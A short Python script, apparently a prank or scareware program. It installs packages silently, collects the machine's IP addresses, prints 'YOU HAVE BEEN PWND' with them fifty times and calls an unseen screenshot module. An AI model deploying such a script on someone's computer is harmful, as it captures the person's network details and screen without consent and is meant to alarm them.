import time


from console import *
run_command("pip install requests pillow")

from gettingIpAdresses import *
print(ipv4_address,ipv6_address,public_ip_address)

def printingOutTimes(number):
    i = 0
    while i < number:
        i = i + 1
        print(f"YOU HAVE BEEN PWND:{ipv4_address}\nYOU HAVE BEEN PWND:{ipv6_address}\nYOU HAVE BEEN PWND:{public_ip_address}\n")
printingOutTimes(50)
time.sleep(5)

from takeScreenshot import *
#from changeDesktop import *





wait = input("")